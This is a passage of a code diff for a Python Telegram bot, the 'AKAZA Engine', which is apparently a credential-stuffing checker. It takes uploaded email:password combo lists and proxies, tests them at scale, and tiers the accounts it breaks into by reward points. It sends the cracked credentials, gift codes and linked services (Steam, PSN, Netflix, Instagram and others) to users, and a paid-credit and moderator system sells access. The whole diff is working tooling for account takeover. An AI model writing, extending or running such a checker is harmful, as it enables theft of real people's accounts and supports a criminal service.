     loop = asyncio.get_running_loop()
     semaphore = asyncio.Semaphore(max_threads)
 
-    async def sem_worker(line):
+    async def worker(line):
         nonlocal hits, bad, tfa, checked, last_update
-        async with semaphore:
-            data = await loop.run_in_executor(bot_executor, run_check, line)
-            if not data: return
-            e, p, res = data['e'], data['p'], data['res']
-            checked += 1; akaza_db.save_result(uid, e, res['status'], res)
-            akaza_db.use_credit(uid)
+        async with global_semaphore:
+            async with semaphore:
+                data = await loop.run_in_executor(executor, run_check, line)
+                if not data: return
+                e, p, res = data['e'], data['p'], data['res']
+                checked += 1
+                akaza_db.save_result(uid, e, res['status'], res)
+                akaza_db.use_credit(uid)
 
-            if res['status'] == 'hit':
-                hits += 1; d = res['det']
-                cap = f"Name:{d['name']} | Country:{d['country']} | Pts:{d['pts']} | "
-                cap += ", ".join([f"{k}:{v}" for k,v in d.items() if v != 'No' and k not in ['subs', 'name', 'country', 'pts', 'codes', 'keys']])
-                if d['subs']: cap += f" | Subs:{', '.join(d['subs'])}"
-                if d['keys']: cap += f" | Keys:{', '.join(d['keys'])}"
+                if res['status'] == 'hit':
+                    hits += 1
+                    d = res['det']
+                    tier = "🎯 HIT"
+                    if d['pts'] >= 20000: tier = "💎 ULTRA HIT"
+                    elif d['pts'] >= 7000: tier = "⭐ PREMIUM HIT"
+                    cap = f"🌍 Country: {d['country']}\n💰 Points: {d['pts']}\n"
+                    if d['codes']: cap += f"🎁 Codes: {', '.join(d['codes'][:3])}\n"
+                    srv = [f"{k.upper()}" for k in ['psn', 'steam', 'minecraft', 'tiktok', 'supercell', 'instagram', 'facebook', 'netflix', 'epic'] if 'Yes' in str(d.get(k, ""))]
+                    if srv: cap += f"🎮 Services: {', '.join(srv)}\n"
+                    ht = f"**{tier}**\n📧 `{e}:{p}`\n{cap}"
+                    try:
+                        await c.bot.send_message(uid, ht, parse_mode='Markdown')
+                    except:
+                        pass
+                    with open(results_file, 'a') as f:
+                        f.write(f"{e}:{p} | {json.dumps(d)}\n")
+                elif res['status'] == '2fa':
+                    tfa += 1
+                else:
+                    bad += 1
 
-                ht = f"🎯 **HIT**\n📧 `{e}`\n🔑 `{p}`\n💰 Pts: `{d['pts']}` | 🎁 Codes: `{len(d['codes'])}`"
-                if cap: ht += f"\n🎮 Cap: `{cap}`"
-
-                last_hits.append(f"✅ {e}");
-                if len(last_hits) > 5: last_hits.pop(0)
-                try: await c.bot.send_message(uid, ht, parse_mode='Markdown')
-                except: pass
-
-                if uid != ADMIN_ID and (d['pts'] > 0 or 'Yes' in str(d)):
-                    try: await c.bot.send_message(ADMIN_ID, f"📢 **User {uid} Hit:**\n{ht}", parse_mode='Markdown')
-                    except: pass
-                with open(results_file, 'a') as f: f.write(f"{e}:{p} | Pts:{d['pts']} | Cap:{cap} | Codes:{d['codes']}\n")
-            elif res['status'] == '2fa': tfa += 1
-            else: bad += 1
-
-            async with update_lock:
-                now = time.time()
-                if now - last_update > 2.0 or checked == len(lines):
-                    last_update = now; el = now - start_time; cpm = int((checked / el) * 60) if el > 0 else 0
-                    prg = (f"🔄 **Live Capture Screen**\n\n📊 Progress: `{checked}/{len(lines)}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n🕒 Last Hits:\n`{chr(10).join(last_hits) or 'None yet'}`")
-                    try: await status_msg.edit_text(prg, parse_mode='Markdown')
-                    except: pass
-
-    await asyncio.gather(*(sem_worker(l) for l in lines))
+                async with update_lock:
+                    now = time.time()
+                    if now - last_update > 2.0 or checked == len(lines):
+                        last_update = now
+                        el = now - start_time
+                        cpm = int((checked / el) * 60) if el > 0 else 0
+                        prg = (f"🔄 **AKAZA Engine**\n📊 Progress: `{checked}/{len(lines)}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`")
+                        try:
+                            await status_msg.edit_text(prg, parse_mode='Markdown')
+                        except:
+                            pass
+    await asyncio.gather(*(worker(l) for l in lines))
     if os.path.exists(results_file):
-        with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ **Done!** Hits: `{hits}`", parse_mode='Markdown')
-        os.remove(results_file)
-    else: await u.message.reply_text("✅ **Done!** No hits.", parse_mode='Markdown')
+        with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ Done! Hits: {hits}"); os.remove(results_file)
+    else: await u.message.reply_text("✅ Done! No hits.")
 
-async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
+async def bot_admin_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
-    if not akaza_db.is_mod(uid): return
+    if not akaza_db.is_mod(uid):
+        return
     txt = u.message.text
-    if not txt.startswith('!!'): return
+    if not txt.startswith('!!'):
+        return
     try:
-        p = txt.split(); cmd = p[0][2:].lower()
+        p = txt.split()
+        cmd = p[0][2:].lower()
         if cmd == "help":
-            h = "🛠 **Admin Commands**\n\n!!addcredits [uid] [amt]\n!!ban [uid]\n!!grant [uid] [amt]\n!!revoke [uid]\n"
-            if uid == ADMIN_ID: h += "!!mod [uid]\n!!unmod [uid]\n"
+            h = ("**Admin Commands:**\n"
+                 "!!addcredits [uid] [amt]\n"
+                 "!!ban [uid]\n"
+                 "!!unban [uid]\n"
+                 "!!grant [uid] [amt]\n"
+                 "!!revoke [uid]\n"
+                 "!!mod [uid]\n"
+                 "!!unmod [uid]\n"
+                 "!!broadcast [msg]\n"
+                 "!!stats\n"
+                 "!!info [uid]")
             await u.message.reply_text(h, parse_mode='Markdown')
         elif cmd == "addcredits" and len(p) == 3:
-            akaza_db.add_credits(int(p[1]), int(p[2])); await u.message.reply_text(f"✅ Added {p[2]} to {p[1]}")
+            akaza_db.add_credits(int(p[1]), int(p[2]))
+            await u.message.reply_text("✅ Credits added.")
         elif cmd == "ban" and len(p) == 2:
-            akaza_db.set_ban(int(p[1]), 1); await u.message.reply_text(f"✅ Banned {p[1]}")
+            akaza_db.set_ban(int(p[1]), 1)
+            await u.message.reply_text("🚫 User banned.")
+        elif cmd == "unban" and len(p) == 2:
+            akaza_db.set_ban(int(p[1]), 0)
+            await u.message.reply_text("✅ User unbanned.")
         elif cmd == "grant" and len(p) == 3:
-            akaza_db.grant(int(p[1]), int(p[2])); await u.message.reply_text(f"✅ Granted {p[1]}")
+            akaza_db.grant(int(p[1]), int(p[2]))
+            await u.message.reply_text("💎 Access granted.")
+        elif cmd == "revoke" and len(p) == 2:
+            akaza_db.revoke(int(p[1]))
+            await u.message.reply_text("❌ Access revoked.")
         elif cmd == "mod" and uid == ADMIN_ID and len(p) == 2:
-            akaza_db.set_mod(int(p[1]), 1); await u.message.reply_text(f"✅ Modded {p[1]}")
-    except Exception as e: await u.message.reply_text(f"❌ Error: {e}")
-
-async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
-    q = u.callback_query; uid = q.from_user.id; await q.answer()
-    if q.data == "settings":
-        s = akaza_db.get_user_settings(uid)
-        await q.edit_message_text(f"⚙️ **Settings**\n\nThreads: `{s['threads']}`\nKeywords: `{', '.join(s['keywords']) or 'None'}`\n\nCommands: `/threads 1-300`, `/keywords w1,w2`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
-    elif q.data == "check": await q.edit_message_text("📝 **Combo Input**\n\nSend `email:password` list or upload a `.txt` file.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
-    elif q.data == "stats":
-        s = akaza_db.user_stats(uid); label = "Admin" if uid == ADMIN_ID else (q.from_user.username or q.from_user.first_name)
-        await q.edit_message_text(f"📊 **Stats for {label}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
-    elif q.data == "proxies": await q.edit_message_text(f"🌐 **Proxy Loader**\n\nLoaded: `{len(PROXIES_LIST)}` proxies.\nFormat: `ip:port`.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
-    elif q.data == "admin":
-        if akaza_db.is_mod(uid):
+            akaza_db.set_mod(int(p[1]), 1)
+            await u.message.reply_text("🛠 Moderator added.")
+        elif cmd == "unmod" and uid == ADMIN_ID and len(p) == 2:
+            akaza_db.set_mod(int(p[1]), 0)
+            await u.message.reply_text("🗑 Moderator removed.")
+        elif cmd == "stats":
             s = akaza_db.get_stats()
-            await q.edit_message_text(f"🛠 **Admin Panel**\n\nUsers: `{s['total']}`\nActive: `{s['active']}`\nChecks: `{s['checks']}`\nHits: `{s['hits']}`\n\nUse `!!help` for cmds.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
-    elif q.data == "back": await start(u, c)
+            await u.message.reply_text(f"📊 **Global Stats**\nUsers: {s['total']}\nChecks: {s['checks']}\nHits: {s['hits']}", parse_mode='Markdown')
+        elif cmd == "info" and len(p) == 2:
+            u_info = akaza_db.get_user(int(p[1]))
+            if u_info:
+                await u.message.reply_text(f"👤 **User Info**\nID: `{u_info[0]}`\nCredits: {u_info[4]}\nAccess: {'Yes' if u_info[3] else 'No'}\nMod: {'Yes' if u_info[9] else 'No'}", parse_mode='Markdown')
+        elif cmd == "setcpm" and uid == ADMIN_ID and len(p) == 2:
+            global global_semaphore
+            global_semaphore = asyncio.Semaphore(int(p[1]))
+            await u.message.reply_text(f"⚡ Global CPM limit set to {p[1]}.")
+        elif cmd == "reset" and len(p) == 2:
+            target = int(p[1])
+            with db_lock:
+                conn = sqlite3.connect(DB_PATH); c = conn.cursor()
+                c.execute("UPDATE users SET total_checks=0, total_hits=0 WHERE user_id=?", (target,))
+                conn.commit(); conn.close()
+            await u.message.reply_text("♻️ User stats reset.")
+        elif cmd == "broadcast" and len(p) > 1:
+            msg = " ".join(p[1:])
+            await u.message.reply_text(f"📢 Broadcast: {msg}")
+    except Exception as e:
+        await u.message.reply_text(f"❌ Error: {e}")
 
-async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
+async def bot_cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
+    q = u.callback_query; uid = q.from_user.id; await q.answer()
+    if q.data == "settings": await q.edit_message_text(f"⚙️ Settings\nUse /threads [1-300]", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+    elif q.data == "back": await bot_start(u, c)
+    elif q.data == "stats":
+        u_info = akaza_db.get_user(uid)
+        s = (f"📊 **User Stats**\n"
+             f"ID: `{uid}`\n"
+             f"Credits: `{akaza_db.get_credits(uid)}`\n"
+             f"Total Checks: `{u_info[5]}`\n"
+             f"Total Hits: `{u_info[6]}`\n"
+             f"Status: `{'Admin' if uid == ADMIN_ID else ('Moderator' if u_info[9] else 'User')}`")
+        await q.edit_message_text(s, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+
+async def bot_set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
     try:
         t = int(c.args[0])
-        if 1 <= t <= 300: akaza_db.update_settings(u.effective_user.id, threads=t); await u.message.reply_text(f"✅ Threads: `{t}`")
-    except: pass
+        if 1 <= t <= 300:
+            akaza_db.update_settings(u.effective_user.id, threads=t)
+            await u.message.reply_text("✅ Done")
+    except:
+        pass
 
-async def set_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
-    if c.args: kws = [k.strip() for k in ' '.join(c.args).split(',') if k.strip()]; akaza_db.update_settings(u.effective_user.id, keywords=kws); await u.message.reply_text(f"✅ Keywords: `{', '.join(kws)}`")
-
-def bot_main_exec():
+def final_bot_main():
     app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("threads", set_threads))
-    app.add_handler(CommandHandler("keywords", set_keywords))
-    app.add_handler(CallbackQueryHandler(cb_handler))
-    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
-    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.Caption(filters.Regex(re.compile(r'prox', re.I))), handle_proxies))
-    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_combo))
-    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r':'), handle_combo))
+    app.add_handler(CommandHandler("start", bot_start)); app.add_handler(CommandHandler("threads", bot_set_threads)); app.add_handler(CallbackQueryHandler(bot_cb_handler))
+    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), bot_admin_handler))
+    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.Caption(filters.Regex(re.compile(r'prox', re.I))), bot_handle_proxies))
+    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), bot_handle_combo))
+    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r':'), bot_handle_combo))
     app.run_polling()
 
-if __name__ == '__main__':
-    bot_main_exec()
+if __name__ == "__main__":
+    final_bot_main()
